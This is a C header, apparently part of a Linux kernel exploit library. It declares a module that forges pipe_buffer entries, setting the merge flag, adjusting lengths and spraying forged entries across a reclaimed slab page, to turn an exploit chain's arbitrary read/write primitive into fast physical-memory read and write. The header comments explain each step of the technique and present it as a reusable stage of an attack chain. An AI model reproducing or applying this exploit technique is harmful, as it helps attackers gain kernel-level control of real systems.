/* lib/rw/pipe_rw.h -- reading and writing a physical page through a pipe.
 *
 * A pipe's buffer array names, for each queued entry, a physical page and a
 * range within it. Overwrite one entry so it names a page of the caller's
 * choosing, and an ordinary read or write of the pipe transfers that page. The
 * result is a physical read and write built from two ordinary calls.
 *
 * Three details decide whether it works. The entry must be marked as one the
 * kernel may extend in place, or a write is refused. A read must declare one
 * byte more than it takes, because the kernel consumes the entry when it is
 * exhausted. And the entry is borrowed, not taken: it belongs to a live pipe,
 * so it is saved before and restored after, or the next ordinary use of that
 * pipe faults.
 *
 * Editing the entry needs a read and write primitive of its own, which is
 * supplied by the caller -- this module is how a chain trades a slow primitive
 * for a fast one, and it must not assume which slow one it started with.
 */
#ifndef LIB_RW_PIPE_RW_H
#define LIB_RW_PIPE_RW_H

#include <stdint.h>
#include <stddef.h>
#include <sys/types.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096UL
#endif
#ifndef PIPE_BUF_FLAG_CAN_MERGE
#define PIPE_BUF_FLAG_CAN_MERGE 0x10
#endif

/* One entry of a pipe's buffer array, as the kernel lays it out. */
struct lib_pipe_buffer {
  uint64_t page;     /* struct page*        */
  uint32_t offset;   /* byte offset in page */
  uint32_t len;      /* valid byte count    */
  uint64_t ops;      /* const pipe_buf_operations* */
  uint32_t flags;
  uint32_t pad;
  uint64_t priv;     /* pipe_buffer.private */
};

/* The read and write used to edit the live entry. Supplied by the caller, since
 * the point of this module is to trade whatever primitive a chain starts with
 * for a faster one, and it must not assume which. Addresses are linear-map
 * aliases; `ctx` carries whatever that primitive needs. */
struct lib_meta_rw {
  void *ctx;
  ssize_t (*read)(void *ctx, uintptr_t addr, void *out, size_t len);
  ssize_t (*write)(void *ctx, uintptr_t addr, const void *data, size_t len);
};

/* Compose an entry naming `direct_addr` for a read (for_write=0) or a write
 * (for_write=1) of `len` bytes. A read declares one byte more than it takes, so
 * the kernel does not consume the entry; a write declares none, so the kernel
 * appends into the page instead of replacing it. */
void lib_pipe_buf_forge(
    struct lib_pipe_buffer *pb, uintptr_t direct_addr, uintptr_t ops,
    size_t len, int for_write);

/* Read `len` bytes of the page aliased by `direct_addr`, by borrowing the entry
 * at `buf_addr` and reading the pipe. The entry is saved first and put back
 * afterwards, because the pipe is live. Returns 1 on success, 0 on failure. */
int lib_pipe_phys_read(
    const struct lib_meta_rw *meta, int pipefd[2], uintptr_t buf_addr,
    uintptr_t direct_addr, uintptr_t ops, void *out, size_t len);

/* The same, writing the pipe instead. */
int lib_pipe_phys_write(
    const struct lib_meta_rw *meta, int pipefd[2], uintptr_t buf_addr,
    uintptr_t direct_addr, uintptr_t ops, const void *data, size_t len);

/* Write the composed entry into every object slot of a reclaimed page. Which
 * slot the live array occupies is not known, so all of them are filled and the
 * one that matters is among them. */
void lib_forge_pipe_buffers_on_page(
    const struct lib_meta_rw *meta, uintptr_t base, uintptr_t direct_addr,
    uintptr_t ops, size_t len, int for_write, size_t slab_size, size_t obj_size);

#endif /* LIB_RW_PIPE_RW_H */
